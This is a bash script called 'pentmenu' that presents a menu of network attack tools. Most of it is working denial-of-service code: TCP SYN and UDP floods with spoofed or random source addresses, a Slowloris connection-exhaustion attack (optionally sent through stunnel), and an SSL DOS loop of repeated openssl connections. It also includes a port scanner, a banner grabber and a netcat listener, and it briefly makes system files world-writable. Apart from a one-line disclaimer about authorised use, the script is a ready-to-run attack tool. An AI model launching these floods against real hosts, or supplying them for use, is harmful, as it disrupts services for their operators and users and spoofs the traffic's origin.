#!/bin/bash
PS3="Pentmenu>"
## create TCP SYN flood function
synflood()
{		echo "TCP SYN Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
## hping3 is found, so use that for TCP SYN Flood
		echo "Enter target"
	read -i $TARGET -e TARGET
		echo "Enter target port"
	read PORT
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --spoof $SOURCE -p $PORT -S $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --rand-source -p $PORT -S $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -p $PORT -S $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -p $PORT -S $TARGET
	fi
## No hping3 so using nping for TCP SYN Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
		echo "Enter target"
	read -i $TARGET -e TARGET
		echo "Enter target port"
	read PORT
		echo "Enter Source IP or use [i]nterface IP (default):"
	read SOURCE
		: ${SOURCE:=i}
		echo "Enter number of packets to send per second (default is 10000):"
	read RATE
		: ${RATE:=10000}
		echo "Enter total number of packets to send (default is 100000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP SYN Flood..."
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}

## create portscan function
portscan()
{		echo "TCP Port Scanner uses netcat..."
		echo "Enter target IP"
	read -i $TARGET -e TARGET
		echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
	read PORT
		echo "Starting TCP Port Scan"
		nc -zv -w 2 $TARGET $PORT
}

## create showip function
showip()
{		echo "External IP lookup uses curl..."
		echo "External IP is detected as:"
		curl http://canihazip.com/s/
		echo ""
		echo ""
		echo "Interface IP's are:"
		ip a|grep inet
	if ! [[ $? = 0 ]]; then
		ifconfig|grep inet
	fi
		echo ""
}

## create slowloris function
slowloris()
{ echo "Using netcat for Slowloris attack...." && sleep 1
echo "Enter target:"
	read -i $TARGET -e TARGET
echo "Target is set to $TARGET"
echo "Enter target port (defaults to 80):"
	read PORT
	: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi

echo "Enter number of connections to open (default 500):"
		read CONNS
	: ${CONNS:=500}
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=500 && echo "Invalid integer!  Using 500 connections"
	fi

echo "Choose interval between sending headers."
echo "Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds:"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then
INTERVAL=$((RANDOM % 11 + 5))
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then
INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
	fi

echo "use SSL? [y]es or [n]o (default):"
	read SSL
	: ${SSL:=n}
if [[ "$SSL" = "y" ]]
	then echo "Using SSL/TLS"
LHOST=127.0.0.1
LPORT=9991
grep -q $LPORT /etc/services
if [[ $? = 1 ]]
then
echo "Adding pentmenu slowloris service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
fi
if test -f "/bin/ss"; then 
	LISTPORT=ss; 
	else LISTPORT=netstat
fi
$LISTPORT -tln |grep -q $LPORT
if [[ "$?" = "1" ]]
then
	echo "Creating stunnel on $LHOST:$LPORT"	
		sudo rm -f /etc/stunnel/pentmenu.conf;
		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
		sudo chmod 644 /etc/stunnel/pentmenu.conf
		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
else echo "Looks like stunnel is already listening on port 9991, so not recreating"
fi
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
echo "Opened $CONNS connections....returning to menu"

else 
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
echo "Opened $CONNS connections....returning to menu"
fi
}

## create UDP Flood function
udpflood()
{ echo "UDP Flood uses hping3...checking for hping3..."
if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
## hping3 is found, so use that for UDP Flood
	echo "Enter target"
		read -i $TARGET -e TARGET
	echo "Enter target port"
		read PORT
	echo "Enter random string (data to send)"
		read DATA
	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
		read SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
	fi
## No hping3 so using nping for UDP Flood instead
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying UDP Flood with nping.."
		echo "Enter target"
	read -i $TARGET -e TARGET
		echo "Enter target port"
	read PORT
		echo "Enter Source IP or use [i]nterface IP (default):"
	read SOURCE
		: ${SOURCE:=i}
		echo "Enter number of packets to send per second (default is 10000):"
	read RATE
		: ${RATE:=10000}
		echo "Enter total number of packets to send (default is 100000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Enter string to send (data):"
	read DATA	
		echo "Starting UDP Flood..."
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
fi
}

## create ssldos function
ssldos() 
{ echo "Using openssl for SSL DOS"
		echo "Enter target:"
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 443):"
read PORT

: ${PORT:=443}

if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
	PORT=443 && echo "You provided a string, not a port number!  Reverting to port 443"
fi
if [ "$PORT" -lt "1" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
elif [ "$PORT" -gt "65535" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
else echo "Using port $PORT"
fi
	echo "Use client renegotiation? [y]es or [n]o (default):"
read NEGOTIATE

: ${NEGOTIATE:=n}

if [[ $NEGOTIATE = y ]]; then
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
while : for i in {1..10} 
	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
done

elif [[ $NEGOTIATE = n ]]; then
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
while : for i in {1..10} 
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
done

else 
	echo "Invalid option, assuming no client renegotiation"
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
while : for i in {1..10} 
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
done
fi
}

## create listener function
listener()
	{ echo "Enter protocol, [t]cp (default) or [u]dp:"
read PROTO
	: ${PROTO:=t}
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
fi
	echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
if test -f "/bin/ss"; then 
	LISTPORT=ss; 
	else LISTPORT=netstat

fi
	$LISTPORT -$PROTO -n -l 
echo "Enter port number (defaults to 8000):"
	read PORT
: ${PORT:=8000}
	if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
		PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
	fi
	if [ "$PORT" -lt "1" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
	elif [ "$PORT" -gt "65535" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000" 
	else echo "Using netcat to create listener:"
fi
echo "Use ctrl c to stop"
if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
	sudo nc -k -l -v -p $PORT
if ! [[ $? = 0 ]]
	then 
		echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
		sudo nc -l -v -p $PORT
fi

elif  [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
nc -k -l -v -p $PORT

if ! [[ $? = 0 ]]; then 
	echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
	nc -l -v -p $PORT
fi

elif  [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
sudo nc -u -k -l -v -p $PORT
	if ! [[ $? = 0 ]]; then 
		echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
		sudo nc -u -l -v -p $PORT
	fi
elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
	nc -u -k -l -v -p $PORT
		if ! [[ $? = 0 ]]; then 
			echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
			nc -u -l -v -p $PORT
		fi
	fi
}

## define simple banner grabber function
bannergrab()
{ echo "Attempting to grab banners using netcat..."
	echo "Enter target"
	read -i $TARGET -e TARGET
		echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
	read PORT
		echo "Starting..."
		echo -e "HEAD / HTTP/1.0\r\n\r\n"| nc -vw 2 $TARGET $PORT
}

## create menu and show welcome message
	clear && echo ""
	echo "Hello and welcome to pentmenu!"
	echo "This software is only for responsible, authorised use."
	echo "YOU are responsible for your own actions!"
	echo ""
	options=("Show IP" "TCP Port Scanner" "Banner Grabber" "TCP SYN Flood" "UDP Flood" "SSL DOS" "Slowloris" "Create Listener" "Quit")
	select opt in "${options[@]}"; do
## quit 
	if [ "$opt" = "Quit" ]; then
		echo "Quitting" && sleep 1 && clear
	exit 0
## show external IP
	elif [ "$opt" = "Show IP" ]; then
		showip
## TCP SYN Flood DOS
 	elif [ "$opt" = "TCP SYN Flood" ]; then
		synflood
## TCP SYN Port Scan using nc
	elif [ "$opt" = "TCP Port Scanner" ]; then
		portscan
	elif [ "$opt" = "Create Listener" ]; then
		listener
## Simple Banner Grabber
	elif [ "$opt" = "Banner Grabber" ]; then
		bannergrab
## SSL DOS
	elif [ "$opt" = "SSL DOS" ]; then
		ssldos
## UDP Flood		
 	elif [ "$opt" = "UDP Flood" ]; then
		udpflood
## Slowloris
	elif [ "$opt" = "Slowloris" ]; then
		slowloris
## Default if no menu option selected is to return an error
	else
  		echo  "That's not a valid option! Hit Return to show main menu"
	fi
done
exit 0
